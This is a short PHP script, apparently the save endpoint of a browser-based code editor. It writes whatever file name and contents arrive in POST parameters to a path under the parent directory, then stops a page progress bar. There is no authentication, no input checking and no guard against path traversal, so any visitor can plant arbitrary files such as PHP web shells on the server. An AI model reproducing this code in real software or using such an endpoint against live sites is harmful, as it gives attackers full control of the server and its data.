<?php
define('DS',DIRECTORY_SEPARATOR);
$file=$_POST['file'];
$code=$_POST['code'];
$fp=fopen('..'.DS.$file,'w');
fwrite($fp,$code);
fclose($fp);?>
<script>/*<![CDATA[*/
  window.top.window.Pace.stop();
/*]]>*/</script>
